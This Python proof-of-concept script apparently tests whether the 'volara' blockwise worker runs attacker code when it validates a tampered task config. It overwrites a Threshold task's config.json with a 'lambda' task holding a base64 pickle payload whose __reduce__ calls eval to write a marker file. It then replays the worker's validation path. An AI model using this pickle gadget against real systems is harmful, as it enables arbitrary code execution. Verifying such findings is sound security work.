"""Does the BASE branch already unpickle an attacker payload from a NON-LambdaTask meta dir?

The finding says: before PR #67 "the same trick required the target to be a LambdaTask".
Test that against the actual worker entry point, `volara.cli.blockwise_worker`.
"""

import base64
import json
import pickle
import sys
from pathlib import Path

import numpy as np
from funlib.persistence import prepare_ds

import volara
from volara.blockwise import Threshold, get_blockwise_tasks_type
from volara.datasets import Affs, Labels, Raw

print("volara from:", volara.__file__)
assert "volara-ops" in volara.__file__, "WRONG TREE"
print("has volara.ops?", Path(volara.__file__).parent.joinpath("ops.py").exists())

tmp = Path(sys.argv[1])
tmp.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------- a victim task
# A perfectly ordinary non-Lambda task. Its meta dir is what the driver writes.
store = tmp / "in.zarr"
prepare_ds(store, shape=(3, 8, 8, 8), dtype=np.uint8, voxel_size=(1, 1, 1),
           offset=(0, 0, 0), axis_names=["c^", "z", "y", "x"], units=["nm"] * 3, mode="w")
victim = Threshold(
    in_data=Raw(store=store),
    mask=Labels(store=tmp / "out.zarr"),
    threshold=0.5,
    block_size=(8, 8, 8),
)
victim_cfg = json.loads(victim.model_dump_json())
print("\nvictim task_type   :", victim_cfg["task_type"])
print("victim config keys :", sorted(victim_cfg))
print("victim has a PydanticCallable field? ",
      any("lambda" in k for k in victim_cfg))

meta = tmp / f"{victim.task_name}-meta"
meta.mkdir(parents=True, exist_ok=True)
config_file = meta / "config.json"
config_file.write_text(victim.model_dump_json())
print("driver wrote:", config_file)


# --------------------------------------------------------- the attacker payload
MARKER = tmp / "PWNED_ON_HEAD.txt"


class _Payload:
    def __reduce__(self):
        return (
            eval,
            ("__import__('pathlib').Path(%r).write_text('code ran during validate')" % str(MARKER),),
        )


hostile_b64 = base64.b64encode(pickle.dumps(_Payload())).decode()

# The attacker overwrites the victim's config.json wholesale. `task_type` is just
# another JSON key, so they pick the model the worker will validate into.
lam_cfg = {
    "task_type": "lambda",
    "in_data": json.loads(Raw(store=store).model_dump_json()),
    "out_data": json.loads(Raw(store=tmp / "out2.zarr").model_dump_json()),
    "lambda_func": hostile_b64,
}
config_file.write_text(json.dumps(lam_cfg))
print("attacker overwrote it with task_type=lambda\n")

# --------------------------------------------- the EXACT worker CLI code path
# volara/cli.py:29-33, verbatim.
assert not MARKER.exists()
config_json = json.loads(config_file.open("r").read())
BlockwiseTasks = get_blockwise_tasks_type()
try:
    config = BlockwiseTasks.validate_python(config_json)
    print("validate_python returned:", type(config).__name__)
except Exception as e:
    print("validate raised:", type(e).__name__, str(e)[:200])

print("\nMARKER EXISTS AFTER VALIDATION:", MARKER.exists())
if MARKER.exists():
    print("MARKER CONTENT:", MARKER.read_text())
